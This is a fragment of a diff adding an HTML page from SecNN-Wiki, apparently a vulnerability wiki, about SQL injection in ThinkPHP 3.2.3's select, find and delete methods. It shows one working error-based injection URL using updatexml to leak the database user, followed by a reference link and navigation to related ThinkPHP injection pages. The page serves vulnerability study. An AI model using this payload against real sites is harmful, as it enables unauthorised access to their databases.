+<span class="nc">table</span><span class="err">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="mf">.0</span><span class="o">-</span><span class="n">sec</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">Home</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="k">Index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">test</span><span class="o">&amp;</span><span class="n">id</span><span class="o">[</span><span class="n">table</span><span class="o">]=</span><span class="k">user</span><span class="o">%</span><span class="mi">20</span><span class="k">where</span><span class="o">%</span><span class="mi">201</span><span class="o">%</span><span class="mi">20</span><span class="ow">and</span><span class="o">%</span><span class="mi">20</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--&amp;id[where]=1</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Thinkphp3.2.3select%26find%26delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/2629#toc-1">https://xz.aliyun.com/t/2629#toc-1</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 3.2.3 update注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 3.1.3 sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
